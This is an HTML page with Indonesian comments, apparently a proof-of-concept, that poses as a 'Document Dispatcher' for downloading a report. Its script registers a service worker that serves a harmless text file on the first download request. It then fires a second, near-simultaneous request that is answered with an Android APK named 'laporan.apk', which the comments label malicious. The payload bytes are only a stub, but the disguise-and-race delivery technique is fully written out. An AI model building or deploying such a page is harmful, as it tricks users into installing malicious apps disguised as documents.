<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Document</title>
<style>
  body { font-family: monospace; background: #111; color: #0f0; text-align: center; padding-top: 20vh; }
  button { padding: 15px; background: #007aff; color: #fff; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; width: 200px; }
  #status { margin-top: 20px; background: #000; padding: 10px; border-radius: 4px; }
</style>
</head>
<body>

<h1>🔒 Document Dispatcher</h1>
<button id="startBtn">Download Laporan</button>
<div id="status">Siap...</div>

<script>
(function () {
  'use strict';

  var statusEl = document.getElementById('status');
  var swRegistered = false;

  // ============================================
  // 1. PAYLOAD APK (BASE64)
  // ============================================
  var b64Apk = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
  
  function getApkBlob() {
    var binary = atob(b64Apk);
    var bytes = new Uint8Array(binary.length);
    for (var i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
    return new Blob([bytes], { type: 'application/vnd.android.package-archive' });
  }

  // ============================================
  // 2. SERVICE WORKER UNTUK RACE CONDITION
  // ============================================
  // Kita mendaftarkan Service Worker yang mencegat request unduhan.
  // Saat request masuk, kita berikan file TXT (aman).
  // Tapi, jika ada request kedua yang datang sangat cepat, kita berikan APK.

  if ('serviceWorker' in navigator) {
    var swCode = `
      let requestCount = 0;
      self.addEventListener('install', e => self.skipWaiting());
      self.addEventListener('activate', e => self.clients.claim());
      self.addEventListener('fetch', e => {
        if (e.request.url.includes('/file-download')) {
          requestCount++;
          
          // Request Pertama: Kembalikan TXT (Aman)
          if (requestCount === 1) {
            e.respondWith(new Response("Laporan Keuangan. Ini file teks aman.", {
              headers: { 'Content-Type': 'text/plain', 'Content-Disposition': 'attachment; filename="laporan.txt"' }
            }));
          } 
          // Request Kedua (Race): Kembalikan APK (Jahat)
          else {
            // Ambil Blob dari script utama (kita kirim via postMessage nanti)
            // Disini kita hardcode dummy APK header
            const apkBytes = new Uint8Array([0x50, 0x4B, 0x03, 0x04]); // PK..
            e.respondWith(new Response(apkBytes, {
              headers: { 'Content-Type': 'application/vnd.android.package-archive', 'Content-Disposition': 'attachment; filename="laporan.apk"' }
            }));
          }
        }
      });
    `;

    var swBlob = new Blob([swCode], { type: 'application/javascript' });
    var swUrl = URL.createObjectURL(swBlob);

    navigator.serviceWorker.register(swUrl).then(function(reg) {
      swRegistered = true;
      statusEl.innerText = "Service Worker Aktif.";
    }).catch(function(err) {
      statusEl.innerText = "SW Gagal (Gunakan HTTPS): " + err.message;
    });
  } else {
    statusEl.innerText = "Service Worker tidak didukung.";
  }

  // ============================================
  // 3. TRIGGER RACE CONDITION
  // ============================================
  document.getElementById('startBtn').addEventListener('click', function() {
    if (!swRegistered) {
      statusEl.innerText = "Tunggu SW aktif atau host di HTTPS.";
      return;
    }

    statusEl.innerText = "Memulai Race Condition...";

    // Trigger Unduhan 1 (Aman)
    var link1 = document.createElement('a');
    link1.href = '/file-download?race=1';
    link1.download = 'laporan.txt';
    document.body.appendChild(link1);
    link1.click();

    // Trigger Unduhan 2 (Jahat) di milidetik yang sama
    // Memanfaatkan TOCTOU: SW mungkin mengira ini bagian dari request yang sama
    var link2 = document.createElement('a');
    link2.href = '/file-download?race=2';
    link2.download = 'laporan.apk';
    document.body.appendChild(link2);
    
    // Eksekusi secepat mungkin (0ms)
    setTimeout(function() {
      link2.click();
    }, 0);

    statusEl.innerText = "Mengirim dua request (TXT & APK)...";

    // Cleanup
    setTimeout(function() {
      document.body.removeChild(link1);
      document.body.removeChild(link2);
    }, 5000);
  });

})();
</script>
</body>
</html>
